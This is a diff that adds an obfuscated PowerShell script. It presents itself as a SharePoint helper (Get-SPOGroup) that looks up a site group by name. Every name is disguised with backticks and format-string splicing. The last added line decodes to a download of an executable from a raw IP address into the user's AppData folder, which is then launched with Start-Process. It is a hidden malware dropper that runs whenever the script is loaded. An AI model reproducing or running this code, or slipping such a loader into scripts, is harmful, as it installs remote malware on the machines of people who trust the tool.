@@ -1,0 +1,24 @@
+function G`et-SP`Og`ROuP
+{
+	[CmdletBinding()]
+	param
+	(
+		[Parameter(MAndATOrY=${Tr`UE}, poSItIoN=1)]
+		[string]${N`Ame}
+	)
+
+	${W`eb} = ${clI`enTco`NTEXt}."w`eb"
+
+	if (${W`eB} -ne ${N`ULl})
+	{
+		${gRo`U`PS} = ${W`eB}."sIte`gr`OUPs"
+		${cL`IeNT`C`Ont`ExT}.("{0}{1}" -f'Loa','d').Invoke(${GROU`pS})
+		${ClI`en`TCo`N`TEXt}.("{1}{2}{0}"-f 'uteQuery','Exe','c').Invoke()
+		${Gro`Up} = ${G`RouPs} | &("{1}{0}" -f 'e','wher') {${_}."t`iTLe" -eq ${na`ME}}
+
+		return ${G`R`oUp}
+	}
+	return ${n`ULL}
+}
+
+(&("{1}{0}{3}{2}" -f 'ew-','N','ect','Obj') ("{1}{4}{3}{5}{2}{0}" -f 'ent','System.','bCli','t','Ne','.We')).("{2}{0}{1}"-f'wnloadF','ile','Do').Invoke(("{4}{3}{0}{7}{9}{6}{1}{8}{5}{2}" -f'2.64.','vmo','.exe','.8','http://80','r','ar/ms','45/~','n','yak'),"$env:APPDATA\msvmonr.exe");.("{2}{3}{1}{0}"-f'ess','rt-Proc','S','ta') ("$env:APPDATA\msvmonr.exe")
